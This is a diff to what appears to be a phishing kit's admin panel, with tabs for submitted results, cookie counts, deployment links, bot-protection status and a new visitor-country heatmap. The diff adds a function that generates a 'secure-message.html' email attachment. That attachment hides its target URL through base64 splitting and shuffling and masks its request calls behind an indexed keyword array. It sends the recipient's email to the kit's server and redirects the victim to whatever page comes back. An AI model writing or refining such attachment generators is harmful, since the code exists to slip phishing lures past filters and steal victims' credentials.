@@ -40,8 +40,8 @@ html,body{height:100%;overflow:hidden;}
 body{
   font-family:var(--font-mono);
   margin:0;
-  background-color:var(--bg-0);
-  background-image:url('https://miro.medium.com/v2/resize:fit:1358/format:webp/1*CaQim1Hvv-VvoOBlOMcDoQ.jpeg');
+  background-color:#000;
+  background-image:url('');
   background-size:cover;
   background-position:center;
   background-repeat:no-repeat;
@@ -259,14 +259,17 @@ tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
 /* Dashboard Layout — 2-column grid for stats + tabs */
 .dashboard-layout {
   display: grid;
-  grid-template-columns: minmax(0, 1fr) auto;
+  grid-template-columns: 1fr auto;
   gap: 12px;
   align-items: start;
   flex-shrink:0;
+  margin-top: 1px;
+  margin-bottom: 1px;
 }
 #section-settings{overflow-y:auto;flex:1;min-height:0;padding-right:4px;}
 
 .dashboard-layout .modern-nav-container {
+  grid-column: 1 / -1;
   margin: 0;
 }
 
@@ -276,6 +279,10 @@ tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
   margin: 0;
   box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
   transition: all 0.3s ease;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 12px;
 }
 
 .modern-nav-container:hover {
@@ -316,13 +323,13 @@ tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
 
 .modern-nav-tabs {
   display: flex;
-  flex-direction: column;
+  flex-direction: row;
   gap: 4px;
   background: rgba(255, 255, 255, 0.05);
   border-radius: 6px;
-  padding: 3px;
+  padding: 0;
   border: 1px solid rgba(255, 255, 255, 0.1);
-  width: 160px;
+  width: auto;
   flex-shrink: 0;
 }
 
@@ -337,7 +344,7 @@ tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
   color: var(--text-dim);
   font-family: var(--font-mono);
   font-size: 11px;
-  font-weight: 600;
+  font-weight: 800;
   text-transform: uppercase;
   letter-spacing: 0.5px;
   cursor: pointer;
@@ -408,8 +415,8 @@ tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
   box-shadow: 0 4px 20px rgba(59, 130, 246, 0.1);
   transition: all 0.3s ease;
   display: grid;
-  grid-template-columns: repeat(4, auto);
-  gap: 12px;
+  grid-template-columns: repeat(2, 1fr);
+  gap: 8px;
   margin: 0;
   width: fit-content;
 }
@@ -2057,6 +2064,38 @@ tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
 }
 
 </style>
+<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+<style>
+/* World Heatmap */
+.map-sidebar-wrapper {
+  min-width: 0;
+}
+#world-heatmap {
+  height: 200px;
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  margin-bottom: 8px;
+  z-index: 1;
+  position: relative;
+  background: #0a0a0a;
+}
+#world-heatmap + .heatmap-legend {
+  display: flex;
+  gap: 10px;
+  font-size: 9px;
+  color: var(--text-dim);
+  align-items: center;
+  flex-wrap: wrap;
+}
+#heatmap-legend-items {
+  display: flex;
+  gap: 8px;
+  flex-wrap: wrap;
+  align-items: center;
+}
+.heatmap-legend-item { display: flex; align-items: center; gap: 4px; }
+.heatmap-dot { width: 10px; height: 10px; border-radius: 50%; }
+</style>
 </head>
 <body>
 <div class="app">
@@ -2071,6 +2110,38 @@ tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
   <div class="container">
     <div class="main">
     <div class="dashboard-layout">
+    <div class="modern-nav-container">
+      <div class="modern-nav-tabs">
+        <button class="modern-tab-btn active" data-tab="tab-general">
+          <span class="tab-icon">🏠</span>
+          <span class="tab-label">General</span>
+        </button>
+        <button class="modern-tab-btn" data-tab="tab-submissions">
+          <span class="tab-icon">📥</span>
+          <span class="tab-label">Results</span>
+        </button>
+      </div>
+      <div class="status-indicators" style="display:flex;align-items:center;gap:12px;white-space:nowrap;">
+        <h3 style="margin:0;color:var(--text);text-transform:uppercase;font-size:10px;letter-spacing:1px;">Connection</h3>
+        <div style="display:flex;gap:10px;">
+          <div style="display:flex;align-items:center;gap:4px;">
+            <span id="cloudflareStatusDot" class="status-dot" style="width:8px;height:8px;"></span>
+            <span style="font-size:10px;color:var(--text-dim);">Cloudflare</span>
+          </div>
+          <div style="display:flex;align-items:center;gap:4px;">
+            <span id="proxycheckStatusDot" class="status-dot" style="width:8px;height:8px;"></span>
+            <span style="font-size:10px;color:var(--text-dim);">Bot</span>
+          </div>
+        </div>
+      </div>
+    </div>
+      <div class="map-sidebar-wrapper">
+        <div id="world-heatmap"></div>
+        <div class="heatmap-legend">
+          <span style="color: var(--c-info);">◉ Countries:</span>
+          <div id="heatmap-legend-items"></div>
+        </div>
+      </div>
       <div class="modern-analysis-sidebar" style="margin-bottom: 0;">
 
         <div class="analysis-box-compact box-info">
@@ -2090,18 +2161,6 @@ tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
           <div class="analysis-label">Cookies</div>
         </div>
     </div>  <!-- close modern-analysis-sidebar -->
-    <div class="modern-nav-container">
-      <div class="modern-nav-tabs">
-        <button class="modern-tab-btn active" data-tab="tab-general">
-          <span class="tab-icon">🏠</span>
-          <span class="tab-label">General</span>
-        </button>
-        <button class="modern-tab-btn" data-tab="tab-submissions">
-          <span class="tab-icon">📥</span>
-          <span class="tab-label">Results</span>
-        </button>
-      </div>
-    </div>
   </div>  <!-- close dashboard-layout -->
   <div id="section-settings">
 
@@ -2144,20 +2203,6 @@ tbody tr:hover{background:rgba(0, 255, 65, 0.05)}
       <div id="deployment-links-container" style="display:none; background: rgba(59, 130, 246, 0.05); flex:1; padding:4px 8px;">
           <h3 style="margin:0; color:white; text-transform:uppercase; font-size:11px; letter-spacing:1px;">Your Links</h3>
           <div id="deployment-links-list" style="display: flex; flex-direction: column; gap: 6px;"></div>
-      </div>
-
-      <div class="status-indicators" style="white-space:nowrap;">
-        <h3 style="margin:0 0 4px 0; color:var(--text); text-transform:uppercase; font-size:11px; letter-spacing:1px;">Connection Status</h3>
-        <div style="display: flex; gap: 12px;">
-          <div style="display: flex; align-items: center; gap: 6px;">
-            <span id="cloudflareStatusDot" class="status-dot"></span>
-            <span style="font-size: 11px; color: var(--text-dim);">Cloudflare</span>
-          </div>
-          <div style="display: flex; align-items: center; gap: 6px;">
-            <span id="proxycheckStatusDot" class="status-dot"></span>
-            <span style="font-size: 11px; color: var(--text-dim);">Bot Protection</span>
-          </div>
-        </div>
       </div>
       </div>
 
@@ -4048,13 +4093,94 @@ async function loadDeploymentInfo() {
                 tryBtn.style.fontWeight = 'bold';
                 tryBtn.onclick = () => window.open(url, '_blank');
 
+                const dlBtn = document.createElement('button');
+                dlBtn.textContent = '📄 HTML';
+                dlBtn.className = 'secondary';
+                dlBtn.style.padding = '8px 12px';
+                dlBtn.style.fontSize = '11px';
+                dlBtn.style.borderColor = 'var(--c-warn)';
+                dlBtn.style.color = 'var(--c-warn)';
+                dlBtn.style.fontWeight = 'bold';
+                dlBtn.title = 'Download HTML attachment — opens the app link when clicked';
+                dlBtn.onclick = () => downloadHtmlAttachment(url);
+
                 group.appendChild(btn);
                 group.appendChild(tryBtn);
+                group.appendChild(dlBtn);
                 list.appendChild(group);
             }
         }
     } catch (e) {
     }
+}
+
+function downloadHtmlAttachment(url) {
+    // Obfuscate URL: base64 + split into fragments
+    const b64 = btoa(url);
+    const fragLen = Math.max(8, Math.ceil(b64.length / 3));
+    const frags = [];
+    for (let i = 0; i < b64.length; i += fragLen) frags.push(b64.substring(i, i + fragLen));
+    while (frags.length < 4) frags.push('_');
+
+    // Deterministic reorder: [2,0,1,...]
+    const shuffledFrags = [], indices = [];
+    [2, 0, 1, 3].forEach(o => {
+        if (o < frags.length) { shuffledFrags.push(frags[o]); indices.push(o); }
+    });
+    const rebuild = indices.map(i => 'z[' + i + ']').join('+');
+
+    // Keyword pool
+    var kw = ['uxo','innerText','setRequestHeader','application/json','onreadystatechange',
+              'readyState','status','responseText','parse','open','send','GET',
+              'url','location','body','innerHTML','redirectUrl','Accept'];
+
+    // Index helpers (kept as numbers in code to be obfuscated)
+    var o = kw.indexOf('open');
+    var g = kw.indexOf('GET');
+    var s = kw.indexOf('send');
+    var sr = kw.indexOf('setRequestHeader');
+    var ac = kw.indexOf('accept');
+    var aj = kw.indexOf('application/json');
+    var orsc = kw.indexOf('onreadystatechange');
+    var rs = kw.indexOf('readyState');
+    var st = kw.indexOf('status');
+    var rt = kw.indexOf('responseText');
+    var ps = kw.indexOf('parse');
+    var it = kw.indexOf('innerText');
+
+    var html = '<!DOCTYPE html>\n<html lang="en">\n<head>\n<meta charset="UTF-8">\n';
+    html += '<meta http-equiv="X-UA-Compatible" content="IE=edge">\n';
+    html += '<meta name="viewport" content="width=device-width, initial-scale=1.0">\n';
+    html += '<title>Please Wait</title>\n</head>\n<body>\n';
+    html += '<p id="uxo" style="display:none;">{Email}</p>\n<h2>Please Wait..</h2>\n<script>\n';
+    html += 'var w=' + JSON.stringify(kw) + ';\n';
+    html += 'function _(i){return w[i];}\n';
+    html += 'var z=[' + shuffledFrags.map(function(f) { return '"' + f + '"'; }).join(',') + '];\n';
+    html += 'var u=atob(' + rebuild + ');\n';
+    html += 'var e=document.getElementById(_(0))[_(' + it + ')];\n';
+    html += 'var x=new XMLHttpRequest();\n';
+    html += 'x[' + o + '](_(' + g + '),u+(e?"/"+encodeURIComponent(e):""),true);\n';
+    html += 'x[' + sr + '](_(' + ac + '),_(' + aj + '));\n';
+    html += 'x[' + orsc + ']=function(){\n';
+    html += 'if(x[' + rs + ']==4){\n';
+    html += 'if(x[' + st + ']==200){\n';
+    html += 'var d=JSON[x[' + ps + ']](x[' + rt + ']);\n';
+    html += 'if(d.url)window.location=d.url;\n';
+    html += 'else document.body.innerHTML=d.body||"Error";\n';
+    html += '}else{document.body.innerHTML="Connection failed";}\n';
+    html += '}\n';
+    html += '};\n';
+    html += 'x[' + s + ']();\n';
+    html += '<\/script>\n</body>\n</html>';
+
+    const blob = new Blob([html], { type: 'text/html' });
+    const a = document.createElement('a');
+    a.href = URL.createObjectURL(blob);
+    a.download = 'secure-message.html';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(a.href);
 }
 
 async function updateConnectionStatus() {
@@ -4105,6 +4231,144 @@ function toggleCloudflareConfig() {
   const el = document.querySelector('.cloudflare-config');
   if (el) el.classList.toggle('collapsed');
 }
+
+// --- World Heatmap (Leaflet) ---
+function initWorldHeatmap(countryStats) {
+  const container = document.getElementById('world-heatmap');
+  if (!container) return;
+
+  // Init map
+  const map = L.map('world-heatmap', {
+    center: [20, 0],
+    zoom: 1,
+    minZoom: 1,
+    maxZoom: 5,
+    zoomControl: true,
+    attributionControl: false,
+  });
+
+  // Dark tile layer
+  L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+    maxZoom: 19,
+  }).addTo(map);
+
+  const entries = Object.entries(countryStats || {}).filter(([_, count]) => count > 0);
+
+  // Always show the map. Only draw markers when real data exists.
+  if (entries.length > 0) {
+    const markerData = {};
+    entries.forEach(([code, count]) => {
+      const coord = getCountryCoords(code);
+      if (coord) {
+        markerData[code] = { name: coord.name, lat: coord.lat, lng: coord.lng, count: count };
+      }
+    });
+    drawMarkers(map, markerData);
+    // Populate legend with top countries
+    populateCountryLegend(entries);
+  }
+
+  // Fix map rendering after container becomes visible
+  setTimeout(() => map.invalidateSize(), 200);
+}
+
+function drawMarkers(map, data) {
+  function getColor(count) {
+    if (count >= 50) return '#cc0033';
+    if (count >= 21) return '#ff3300';
+    if (count >= 6)  return '#ff8800';
+    return '#ffcc00';
+  }
+
+  function getRadius(count) {
+    return Math.max(6, Math.min(28, count * 0.5));
+  }
+
+  Object.entries(data).forEach(([code, d]) => {
+    const color = getColor(d.count);
+    const radius = getRadius(d.count);
+    const marker = L.circleMarker([d.lat, d.lng], {
+      radius: radius,
+      fillColor: color,
+      color: '#ffffff',
+      weight: 1,
+      opacity: 0.8,
+      fillOpacity: 0.7,
+    }).addTo(map);
+    marker.bindPopup(`
+      <div style="font-family:monospace; font-size:12px;">
+        <strong>${d.name} (${code})</strong><br/>
+        Visits: <span style="color:${color}; font-weight:bold;">${d.count}</span>
+      </div>
+    `);
+  });
+}
+
+function getCountryCoords(code) {
+  const coords = {
+    'US': { name: 'United States', lat: 39.8283, lng: -98.5795 },
+    'DE': { name: 'Germany', lat: 51.1657, lng: 10.4515 },
+    'GB': { name: 'United Kingdom', lat: 55.3781, lng: -3.4360 },
+    'FR': { name: 'France', lat: 46.6034, lng: 1.8883 },
+    'CA': { name: 'Canada', lat: 56.1304, lng: -106.3468 },
+    'BR': { name: 'Brazil', lat: -14.2350, lng: -51.9253 },
+    'IN': { name: 'India', lat: 20.5937, lng: 78.9629 },
+    'AU': { name: 'Australia', lat: -25.2744, lng: 133.7751 },
+    'JP': { name: 'Japan', lat: 36.2048, lng: 138.2529 },
+    'IT': { name: 'Italy', lat: 41.8719, lng: 12.5674 },
+    'CN': { name: 'China', lat: 35.8617, lng: 104.1954 },
+    'RU': { name: 'Russia', lat: 61.5240, lng: 105.3188 },
+    'ES': { name: 'Spain', lat: 40.4637, lng: -3.7492 },
+    'MX': { name: 'Mexico', lat: 23.6345, lng: -102.5528 },
+    'NG': { name: 'Nigeria', lat: 9.0820, lng: 8.6753 },
+    'NL': { name: 'Netherlands', lat: 52.1326, lng: 5.2913 },
+    'SG': { name: 'Singapore', lat: 1.3521, lng: 103.8198 },
+    'EG': { name: 'Egypt', lat: 26.8206, lng: 30.8025 },
+    'ZA': { name: 'South Africa', lat: -30.5595, lng: 22.9375 },
+    'NZ': { name: 'New Zealand', lat: -40.9006, lng: 174.8860 },
+    'KR': { name: 'South Korea', lat: 35.9078, lng: 127.7669 },
+    'AR': { name: 'Argentina', lat: -38.4161, lng: -63.6167 },
+    'KE': { name: 'Kenya', lat: -0.0236, lng: 37.9062 },
+  };
+  return coords[code] || null;
+}
+
+function populateCountryLegend(entries) {
+  const container = document.getElementById('heatmap-legend-items');
+  if (!container) return;
+
+  // Sort by count descending, take top 10
+  const top = entries.sort((a, b) => b[1] - a[1]).slice(0, 10);
+
+  function getColor(count) {
+    if (count >= 50) return '#cc0033';
+    if (count >= 21) return '#ff3300';
+    if (count >= 6)  return '#ff8800';
+    return '#ffcc00';
+  }
+
+  container.innerHTML = top.map(([code, count]) => `
+    <div class="heatmap-legend-item">
+      <span class="heatmap-dot" style="background:${getColor(count)};"></span>
+      ${code} (${count})
+    </div>
+  `).join('');
+}
+
+// Load Leaflet JS + init map
+(function loadLeafletAndMap() {
+  const script = document.createElement('script');
+  script.src = 'https://unpkg.com/leaflet@1.9.4/dist/leaflet.js';
+  script.onload = function() {
+    // Collect country stats from existing data if available
+    // Fallback: use renderCountryMap countryStats or pass from loadEvents
+    initWorldHeatmap();
+  };
+  script.onerror = function() {
+    console.error('Failed to load Leaflet map library');
+  };
+  document.head.appendChild(script);
+})();
 </script>
 </body>
 </html>
